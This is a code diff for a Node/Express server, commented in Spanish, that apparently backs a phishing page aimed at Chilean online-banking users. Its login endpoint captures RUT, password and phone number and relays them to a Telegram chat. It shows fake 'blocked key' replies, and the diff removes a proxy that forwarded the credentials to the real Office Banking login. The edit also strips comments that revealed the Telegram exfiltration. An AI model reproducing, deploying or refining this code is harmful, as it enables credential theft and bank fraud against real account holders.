@@ -7,7 +7,7 @@ const app = express();
 // Habilitar CORS para permitir llamadas desde GitHub Pages
 app.use(cors());
 
-// Middleware para parsear JSON y formularios
+// Middleware para parsear JSON
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -16,9 +16,9 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 // Lista de RUTs bloqueados
-const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
+const bloqueados = ["250624344", "25062434-4", "25.062.434-4"]; // agrega aquí los RUTs que quieras bloquear
 
-// Endpoint de login (envía datos a Telegram)
+// Endpoint de login
 app.post("/login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
@@ -26,6 +26,7 @@ app.post("/login", async (req, res) => {
     return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
   }
 
+  // Validación de RUT bloqueado
   if (bloqueados.includes(rut)) {
     return res.status(403).send("❌ Tu clave digital ha sido bloqueada");
   }
@@ -49,26 +50,7 @@ Teléfono: ${telefono}`;
   }
 });
 
-// Nuevo endpoint de proxy hacia Office Banking
-app.post("/proxy-login", async (req, res) => {
-  const { rut, passwd } = req.body;
-
-  try {
-    const externalResponse = await fetch("https://wslogin.officebanking.cl/", {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: new URLSearchParams({ rut, clave: passwd })
-    });
-
-    const result = await externalResponse.text();
-    res.status(externalResponse.status).send(result);
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("❌ Error al conectar con Office Banking");
-  }
-});
-
-// Endpoint de autorización (envía mensaje a Telegram)
+// Endpoint de autorización
 app.post("/autorizar", async (req, res) => {
   const mensaje = "AUTORIZAR!!!";
 
